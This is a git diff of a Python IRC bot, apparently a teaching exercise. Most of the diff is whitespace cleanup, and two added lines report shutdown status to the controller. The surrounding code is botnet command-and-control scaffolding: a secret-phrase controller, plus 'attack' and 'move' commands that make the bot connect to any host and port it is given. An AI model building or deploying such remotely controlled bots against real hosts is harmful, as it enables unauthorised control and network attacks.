@@ -30,20 +30,20 @@ class Bot():
         self.move_port = None
         self.move_channel = None
         self.move_socket = None
-        
+
         # attack variables
         self.target_socket = None
         self.target_host = None
         self.target_port = None
         self.attack_counter = 0
-    
+
     def __send_to_channel(self, msg):
         '''
         send message to bot's channel
         format PRIVMSG <#channel> :<message>
         '''
         self.__send_message('PRIVMSG ' + self.channel + ' :' + msg + '\n')
-    
+
     def __send_to_controller(self, msg):
         '''
         send message to specific user
@@ -56,7 +56,7 @@ class Bot():
         send any message to target
         '''
         self.target_socket.send((msg + '\n').encode('utf-8'))
-    
+
     def __send_message(self, msg):
         '''
         send any message to irc server
@@ -65,7 +65,7 @@ class Bot():
 
     def __receive_message(self):
         '''
-        receives message from IRC server and keeps 
+        receives message from IRC server and keeps
         connection alive by responding to 'PING #' with 'PONG #'
         and finally returns message
         '''
@@ -74,7 +74,7 @@ class Bot():
             self.__send_message('PONG ' + received_msg.split() [1] + '\r\n')
 
         return received_msg
-    
+
     def __attempt_connection(self):
         '''
         '''
@@ -114,7 +114,7 @@ class Bot():
         self.__authenticate(sock, nickname, channel)
         sock.settimeout(None)
         return sock
-    
+
     def __authenticate(self, sock, nickname, channel):
         sock.send(('USER ' + nickname + ' ' + nickname + ' ' + nickname + ' :\n').encode('utf-8'))
         sock.send(('NICK ' + nickname + '\n').encode('utf-8'))
@@ -125,7 +125,7 @@ class Bot():
         connect to target address using:
             target_host
             target_port
-        
+
         return True if connection to target is successful, False otherwise
         '''
         log('Connecting to target: {}:{}'.format(self.target_host, int(self.target_port)))
@@ -153,19 +153,20 @@ class Bot():
                 self.__do_status()
             except ValueError as e:
                 log('Status Command Error: {}'.format(e))
-        
+
         elif cmd[0] == 'shutdown':
             try:
                 self.__do_shutdown()
             except ValueError as e:
+                self.__send_to_channel('{} failed to shutdown'.format(self.nickname))
                 log('Shutdown Command Error: {}'.format(e))
-        
+
         elif cmd[0] == 'attack':
             try:
                 self.__do_attack(cmd)
             except ValueError as e:
                 log('Attack Command Error: {}'.format(e))
-        
+
         elif cmd[0] == 'move':
             if not (cmd[0] == 'move'):
                 # if command is misspelled
@@ -174,7 +175,7 @@ class Bot():
                 self.__do_move(cmd)
             except ValueError as e:
                 log('Move Command Error: {}'.format(e))
-        
+
         else:
             raise ValueError('Invalid command!')
 
@@ -202,7 +203,7 @@ class Bot():
         '''
         _, new_nickname = msg.split('NICK')
         new_nickname = new_nickname.strip()
-        
+
         old_nickname = self.controller_nickname
         self.controller = self.controller.replace(old_nickname, new_nickname)
         self.controller_nickname = new_nickname
@@ -235,16 +236,16 @@ class Bot():
             except KeyboardInterrupt:
                 log('\nKeyboard interrupt, exiting..')
                 return
-            
+
             if not self.__validate_msg(msg):
                 log('Warning: non-cotroller msg')
                 log(msg)
                 continue
-            
+
             if self.controller == None:
                 self.__verify_controller(msg)
                 continue
-            
+
             if not msg.startswith(':' + self.controller):
                 continue
 
@@ -275,13 +276,14 @@ class Bot():
         '''
         self.__send_to_controller(self.nickname)
         return
-    
+
     def __do_shutdown(self):
         '''
         perform shutdown command
         terminate bot program
         '''
         log('Shutdown command received, terminating connection.')
+        self.__send_to_controller('{} shutting down'.format(self.nickname))
         raise ShutdownError()
 
     def __do_attack(self, cmd):
@@ -296,7 +298,7 @@ class Bot():
             target_port = cmd[2]
         except ValueError:
             raise ValueError('Failed to split attack.')
-        
+
         # TODO validate ip
         if self.__validate_port(target_port):
             self.target_port = int(target_port)
@@ -309,12 +311,12 @@ class Bot():
         self.__connect_to_target()
         self.__attack()
         return
-        
+
     def __attack(self):
         '''
-        Every bot will connect to the given host/port and 
+        Every bot will connect to the given host/port and
         send a message containing two entries: a counter and
-        the nick of the bot. On the next attack the counter 
+        the nick of the bot. On the next attack the counter
         should be increased by 1.
         '''
         try:
@@ -326,7 +328,7 @@ class Bot():
             return
         self.attack_counter += 1
         self.__send_to_controller('Attack on {}:{} success!\n{} {}'.format(self.target_host, self.target_port, self.nickname, self.attack_counter))
-   
+
     def __do_move(self, cmd):
         '''
         perform move command
@@ -341,13 +343,13 @@ class Bot():
         except ValueError:
             raise ValueError('Failed to split move.')
         log('Moving to {}:{}, channel {}'.format(host, int(port), channel))
-        
+
         self.move_host = host
         if self.__validate_port(port):
             self.move_port = int(port)
         else:
             raise ValueError('Invalid port: {}'.format(port))
-        
+
         self.move_channel = '#' + channel
         self.move_socket = self.__attempt_connection()
         if not self.move_socket:
@@ -364,7 +366,7 @@ class Bot():
         '''
         start bot
         source: https://stackoverflow.com/questions/2968408
-        '''  
+        '''
         self.irc_socket = self.__connect_to_irc()
         if self.irc_socket != False:
             self.__listen()
@@ -420,7 +422,7 @@ def main():
     # start bot
     bot = Bot(args.hostname, int(args.port), args.channel, args.secret_phrase)
     bot.start_bot()
-    
+
 
 if __name__ == '__main__':
     main()
